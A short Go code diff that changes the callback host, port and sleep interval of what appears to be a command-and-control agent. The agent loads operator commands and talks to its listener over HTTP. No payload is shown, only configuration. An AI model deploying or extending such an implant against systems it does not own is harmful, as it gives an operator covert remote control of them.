@@ -21,9 +21,9 @@ var (
 )
 
 func main() {
-	LHOST := "192.168.174.154"
-	LPORT := 8001
-	SLEEP := 5
+	LHOST := "localhost"
+	LPORT := 8000
+	SLEEP := 30
 	generateMetadata()
 	loadAgentCommands()
 	commModule = models.NewHttpCommModule(LHOST, LPORT)
